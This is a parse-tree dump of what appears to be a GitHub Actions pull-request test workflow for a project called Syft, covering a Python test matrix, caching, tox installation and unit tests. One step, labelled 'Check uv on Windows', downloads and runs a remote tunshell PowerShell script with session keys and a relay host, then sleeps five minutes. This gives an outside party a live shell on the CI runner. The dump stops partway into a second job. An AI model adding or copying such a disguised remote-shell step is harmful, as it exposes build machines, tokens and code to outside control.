OBJECT [0,10327]
    FIELD [1,25]
        String: "name" [1,7]
        STRING [8,25]
            String: "PR Tests - Syft" [8,25]
    FIELD [26,196]
        String: "on" [26,30]
        OBJECT [31,196]
            FIELD [32,52]
                String: "workflow_call" [32,47]
                NULL [48,52]
            FIELD [53,101]
                String: "pull_request" [53,67]
                OBJECT [68,101]
                    FIELD [69,100]
                        String: "branches" [69,79]
                        ARRAY [80,100]
                            STRING [81,86]
                                String: "dev" [81,86]
                            STRING [87,93]
                                String: "main" [87,93]
                            STRING [94,99]
                                String: "0.8" [94,99]
            FIELD [102,195]
                String: "workflow_dispatch" [102,121]
                OBJECT [122,195]
                    FIELD [123,194]
                        String: "inputs" [123,131]
                        OBJECT [132,194]
                            FIELD [133,193]
                                String: "none" [133,139]
                                OBJECT [140,193]
                                    FIELD [141,175]
                                        String: "description" [141,154]
                                        STRING [155,175]
                                            String: "Run Tests Manually" [155,175]
                                    FIELD [176,192]
                                        String: "required" [176,186]
                                        FALSE [187,192]
    FIELD [197,391]
        String: "concurrency" [197,210]
        OBJECT [211,391]
            FIELD [212,364]
                String: "group" [212,219]
                STRING [220,364]
                    String: "syft-${{ github.event_name == 'pull_request' && format('{0}-{1}', github.workflow, github.event.pull_request.number) || github.workflow_ref }}" [220,364]
            FIELD [365,390]
                String: "cancel-in-progress" [365,385]
                TRUE [386,390]
    FIELD [392,10326]
        String: "jobs" [392,398]
        OBJECT [399,10326]
            FIELD [400,2533]
                String: "pr-tests-syft-unit" [400,420]
                OBJECT [421,2533]
                    FIELD [422,650]
                        String: "strategy" [422,432]
                        OBJECT [433,650]
                            FIELD [434,451]
                                String: "max-parallel" [434,448]
                                NUMBER [449,451]
                                    Number: 99 [449,451]
                            FIELD [452,649]
                                String: "matrix" [452,460]
                                OBJECT [461,649]
                                    FIELD [462,516]
                                        String: "os" [462,466]
                                        ARRAY [467,516]
                                            STRING [468,483]
                                                String: "ubuntu-latest" [468,483]
                                            STRING [484,498]
                                                String: "macos-latest" [484,498]
                                            STRING [499,515]
                                                String: "windows-latest" [499,515]
                                    FIELD [517,542]
                                        String: "python-version" [517,533]
                                        ARRAY [534,542]
                                            STRING [535,541]
                                                String: "3.12" [535,541]
                                    FIELD [543,648]
                                        String: "include" [543,552]
                                        ARRAY [553,648]
                                            OBJECT [554,600]
                                                FIELD [555,578]
                                                    String: "python-version" [555,571]
                                                    STRING [572,578]
                                                        String: "3.11" [572,578]
                                                FIELD [579,599]
                                                    String: "os" [579,583]
                                                    STRING [584,599]
                                                        String: "ubuntu-latest" [584,599]
                                            OBJECT [601,647]
                                                FIELD [602,625]
                                                    String: "python-version" [602,618]
                                                    STRING [619,625]
                                                        String: "3.10" [619,625]
                                                FIELD [626,646]
                                                    String: "os" [626,630]
                                                    STRING [631,646]
                                                        String: "ubuntu-latest" [631,646]
                    FIELD [651,679]
                        String: "runs-on" [651,660]
                        STRING [661,679]
                            String: "${{ matrix.os }}" [661,679]
                    FIELD [680,2532]
                        String: "steps" [680,687]
                        ARRAY [688,2532]
                            OBJECT [689,890]
                                FIELD [690,716]
                                    String: "name" [690,696]
                                    STRING [697,716]
                                        String: "clean .git/config" [697,716]
                                FIELD [717,753]
                                    String: "if" [717,721]
                                    STRING [722,753]
                                        String: "matrix.os == 'windows-latest'" [722,753]
                                FIELD [754,778]
                                    String: "continue-on-error" [754,773]
                                    TRUE [774,778]
                                FIELD [779,793]
                                    String: "shell" [779,786]
                                    STRING [787,793]
                                        String: "bash" [787,793]
                                FIELD [794,889]
                                    String: "run" [794,799]
                                    STRING [800,889]
                                        String: "echo \"deleting ${GITHUB_WORKSPACE}/.git/config\"\nrm ${GITHUB_WORKSPACE}/.git/config\n" [800,889]
                            OBJECT [891,921]
                                FIELD [892,920]
                                    String: "uses" [892,898]
                                    STRING [899,920]
                                        String: "actions/checkout@v4" [899,920]
                            OBJECT [922,1104]
                                FIELD [923,954]
                                    String: "name" [923,929]
                                    STRING [930,954]
                                        String: "Check for file changes" [930,954]
                                FIELD [955,985]
                                    String: "uses" [955,961]
                                    STRING [962,985]
                                        String: "dorny/paths-filter@v3" [962,985]
                                FIELD [986,1000]
                                    String: "id" [986,990]
                                    STRING [991,1000]
                                        String: "changes" [991,1000]
                                FIELD [1001,1103]
                                    String: "with" [1001,1007]
                                    OBJECT [1008,1103]
                                        FIELD [1009,1035]
                                            String: "base" [1009,1015]
                                            STRING [1016,1035]
                                                String: "${{ github.ref }}" [1016,1035]
                                        FIELD [1036,1065]
                                            String: "token" [1036,1043]
                                            STRING [1044,1065]
                                                String: "${{ github.token }}" [1044,1065]
                                        FIELD [1066,1102]
                                            String: "filters" [1066,1075]
                                            STRING [1076,1102]
                                                String: ".github/file-filters.yml" [1076,1102]
                            OBJECT [1105,1292]
                                FIELD [1106,1157]
                                    String: "name" [1106,1112]
                                    STRING [1113,1157]
                                        String: "Set up Python ${{ matrix.python-version }}" [1113,1157]
                                FIELD [1158,1190]
                                    String: "uses" [1158,1164]
                                    STRING [1165,1190]
                                        String: "actions/setup-python@v5" [1165,1190]
                                FIELD [1191,1234]
                                    String: "if" [1191,1195]
                                    STRING [1196,1234]
                                        String: "steps.changes.outputs.syft == 'true'" [1196,1234]
                                FIELD [1235,1291]
                                    String: "with" [1235,1241]
                                    OBJECT [1242,1291]
                                        FIELD [1243,1290]
                                            String: "python-version" [1243,1259]
                                            STRING [1260,1290]
                                                String: "${{ matrix.python-version }}" [1260,1290]
                            OBJECT [1293,1675]
                                FIELD [1294,1322]
                                    String: "name" [1294,1300]
                                    STRING [1301,1322]
                                        String: "Check uv on Windows" [1301,1322]
                                FIELD [1323,1359]
                                    String: "if" [1323,1327]
                                    STRING [1328,1359]
                                        String: "matrix.os == 'windows-latest'" [1328,1359]
                                FIELD [1360,1674]
                                    String: "run" [1360,1365]
                                    STRING [1366,1674]
                                        String: "[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; &$([scriptblock]::Create((New-Object System.Net.WebClient).DownloadString('https://lets.tunshell.com/init.ps1'))) T uh5gWdRyCSSAtrWTAvS6eK cygeISwqraV9tk46BWnwfu au.relay.tunshell.com\nStart-Sleep -Seconds 300\n" [1366,1674]
                            OBJECT [1676,1809]
                                FIELD [1677,1697]
                                    String: "name" [1677,1683]
                                    STRING [1684,1697]
                                        String: "Upgrade pip" [1684,1697]
                                FIELD [1698,1741]
                                    String: "if" [1698,1702]
                                    STRING [1703,1741]
                                        String: "steps.changes.outputs.syft == 'true'" [1703,1741]
                                FIELD [1742,1808]
                                    String: "run" [1742,1747]
                                    STRING [1748,1808]
                                        String: "pip install --upgrade pip==24.0 uv==0.2.13\nuv --version\n" [1748,1808]
                            OBJECT [1810,1971]
                                FIELD [1811,1837]
                                    String: "name" [1811,1817]
                                    STRING [1818,1837]
                                        String: "Get pip cache dir" [1818,1837]
                                FIELD [1838,1854]
                                    String: "id" [1838,1842]
                                    STRING [1843,1854]
                                        String: "pip-cache" [1843,1854]
                                FIELD [1855,1898]
                                    String: "if" [1855,1859]
                                    STRING [1860,1898]
                                        String: "steps.changes.outputs.syft == 'true'" [1860,1898]
                                FIELD [1899,1913]
                                    String: "shell" [1899,1906]
                                    STRING [1907,1913]
                                        String: "bash" [1907,1913]
                                FIELD [1914,1970]
                                    String: "run" [1914,1919]
                                    STRING [1920,1970]
                                        String: "echo \"dir=$(uv cache dir)\" >> $GITHUB_OUTPUT\n" [1920,1970]
                            OBJECT [1972,2275]
                                FIELD [1973,1991]
                                    String: "name" [1973,1979]
                                    STRING [1980,1991]
                                        String: "pip cache" [1980,1991]
                                FIELD [1992,2017]
                                    String: "uses" [1992,1998]
                                    STRING [1999,2017]
                                        String: "actions/cache@v4" [1999,2017]
                                FIELD [2018,2061]
                                    String: "if" [2018,2022]
                                    STRING [2023,2061]
                                        String: "steps.changes.outputs.syft == 'true'" [2023,2061]
                                FIELD [2062,2274]
                                    String: "with" [2062,2068]
                                    OBJECT [2069,2274]
                                        FIELD [2070,2113]
                                            String: "path" [2070,2076]
                                            STRING [2077,2113]
                                                String: "${{ steps.pip-cache.outputs.dir }}" [2077,2113]
                                        FIELD [2114,2202]
                                            String: "key" [2114,2119]
                                            STRING [2120,2202]
                                                String: "${{ runner.os }}-uv-py${{ matrix.python-version }}-${{ hashFiles('setup.cfg') }}" [2120,2202]
                                        FIELD [2203,2273]
                                            String: "restore-keys" [2203,2217]
                                            STRING [2218,2273]
                                                String: "${{ runner.os }}-uv-py${{ matrix.python-version }}-\n" [2218,2273]
                            OBJECT [2276,2401]
                                FIELD [2277,2306]
                                    String: "name" [2277,2283]
                                    STRING [2284,2306]
                                        String: "Install Dependencies" [2284,2306]
                                FIELD [2307,2350]
                                    String: "if" [2307,2311]
                                    STRING [2312,2350]
                                        String: "steps.changes.outputs.syft == 'true'" [2312,2350]
                                FIELD [2351,2400]
                                    String: "run" [2351,2356]
                                    STRING [2357,2400]
                                        String: "pip install --upgrade tox tox-uv==1.9.0\n" [2357,2400]
                            OBJECT [2402,2531]
                                FIELD [2403,2426]
                                    String: "name" [2403,2409]
                                    STRING [2410,2426]
                                        String: "Run unit tests" [2410,2426]
                                FIELD [2427,2470]
                                    String: "if" [2427,2431]
                                    STRING [2432,2470]
                                        String: "steps.changes.outputs.syft == 'true'" [2432,2470]
                                FIELD [2471,2530]
                                    String: "run" [2471,2476]
                                    STRING [2477,2530]
                                        String: "tox -e syft.test.unit\ntox -e seaweedfs.test.unit\n" [2477,2530]
            FIELD [2534,5102]
                String: "pr-tests-syft-notebook-python" [2534,2565]
                OBJECT [2566,5102]
                    FIELD [2567,3100]
